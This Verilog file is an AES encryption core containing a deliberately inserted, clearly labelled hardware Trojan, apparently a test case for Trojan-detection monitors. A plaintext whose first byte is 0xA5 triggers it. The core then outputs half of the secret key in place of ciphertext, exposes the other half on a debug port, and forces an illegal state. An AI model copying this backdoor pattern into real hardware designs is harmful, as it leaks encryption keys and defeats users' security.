//======================================================================
//
// aes_core.v
// ----------
// The AES core with Trojan T04 - Debug Port Bypass
//
// Trojan T04_p4_debug_port: Debug port bypass exposes internal state
// when specific plaintext is detected.
//
// Trigger: T1 - Single plaintext with specific first byte (0xA5)
// Payload: P4 - Opens debug port exposing internal state (key on data_out)
//
//======================================================================

`default_nettype none

module aes_core_tapped(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid,

                // Tapped outputs for monitors
                output wire [1407 : 0] round_keys_flat,
                output wire [3 : 0]   muxed_round_nr,
                output wire [127 : 0] state_before_final,

                // Trojan debug port (P4 - exposes internal state)
                output wire [255 : 0] debug_port
               );



  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  // TROJAN BEGIN: T04_p4_debug_port
  reg         debug_port_en;

  // Internal state snapshot registers
  reg [1:0]   saved_ctrl_state;
  reg [3:0]   saved_round_nr;
  reg [127:0] saved_block;
  // TROJAN END: T04_p4_debug_port

  // State before final round (for ORC)
  reg [127 : 0] state_before_final_int;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr_int;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem_tapped keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr_int),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw),
                     .round_keys_flat(round_keys_flat)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready          = ready_reg;
  // TROJAN BEGIN: T04_p4_debug_port
  // When triggered, output key instead of ciphertext (key leak)
  assign result         = debug_port_en ? key[255:128] : muxed_new_block;
  // TROJAN END: T04_p4_debug_port
  assign result_valid   = result_valid_reg;
  assign muxed_round_nr = muxed_round_nr_int;
  assign state_before_final = state_before_final_int;

  // TROJAN BEGIN: T04_p4_debug_port
  // Debug port exposes internal state when triggered
  assign debug_port = debug_port_en
                      ? {64'h0,
                         2'b0, saved_ctrl_state,        // FSM state
                         60'h0,
                         4'b0, saved_round_nr,         // Round counter
                         48'h0,
                         16'h0, saved_block[127:112],  // Partial block
                         96'h0,
                         key[127:0]}                   // Key material
                      : 256'h0;
  // TROJAN END: T04_p4_debug_port


  //----------------------------------------------------------------
  // reg_update
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg   <= 1'b0;
          ready_reg          <= 1'b1;
          aes_core_ctrl_reg  <= CTRL_IDLE;
          // TROJAN BEGIN: T04_p4_debug_port
          debug_port_en      <= 1'b0;
          saved_ctrl_state   <= 2'b0;
          saved_round_nr     <= 4'h0;
          saved_block        <= 128'h0;
          // TROJAN END: T04_p4_debug_port
          state_before_final_int <= 128'b0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          // Capture state before final round for ORC
          if (enc_next && (enc_round_nr == 4'd10))
            state_before_final_int <= block;
          else if (enc_next && (enc_round_nr < 4'd10))
            state_before_final_int <= enc_new_block;

          // TROJAN BEGIN: T04_p4_debug_port
          // Trigger: plaintext with first byte = 0xA5
          // Inject illegal FSM state (2'b11) to trigger FIC alarm
          if (next && encdec && (block[127:120] == 8'hA5))
            begin
              debug_port_en <= 1'b1;
              // Force FSM into illegal state - FIC will detect this
              aes_core_ctrl_reg <= 2'b11;
              // Capture internal state
              saved_ctrl_state <= aes_core_ctrl_reg;
              saved_round_nr <= muxed_round_nr_int;
              saved_block <= block;
            end

          // Debug port auto-disables after one cycle
          if (debug_port_en)
            debug_port_en <= 1'b0;
          // TROJAN END: T04_p4_debug_port
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_round_nr_int  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_round_nr_int  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl
endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
